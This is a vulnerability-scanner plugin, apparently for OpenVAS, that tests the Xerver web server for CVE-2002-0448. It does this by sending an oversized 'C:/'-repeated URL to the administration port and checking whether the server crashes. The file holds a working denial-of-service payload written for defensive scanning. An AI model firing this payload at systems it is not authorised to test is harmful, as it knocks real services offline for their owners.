if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11015" );
	script_version( "2019-11-22T13:51:04+0000" );
	script_tag( name: "last_modification", value: "2019-11-22 13:51:04 +0000 (Fri, 22 Nov 2019)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 4254 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_cve_id( "CVE-2002-0448" );
	script_name( "Xerver web server DOS" );
	script_category( ACT_DENIAL );
	script_copyright( "This script is Copyright (C) 2002 Michel Arboi" );
	script_family( "Denial of Service" );
	script_dependencies( "find_service.sc", "global_settings.sc" );
	script_require_ports( 32123 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade your software." );
	script_tag( name: "summary", value: "It was possible to crash the Xerver web server by sending a long URL
  (C:/C:/...C:/) to its administration port." );
	script_tag( name: "impact", value: "An attacker may use this attack to make this
  service crash continuously." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
port = 32123;
if(!get_port_state( port )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
s = NASLString( "GET /", crap( data: "C:/", length: 1500000 ), "\\r\\n\\r\\n" );
send( socket: soc, data: s );
close( soc );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

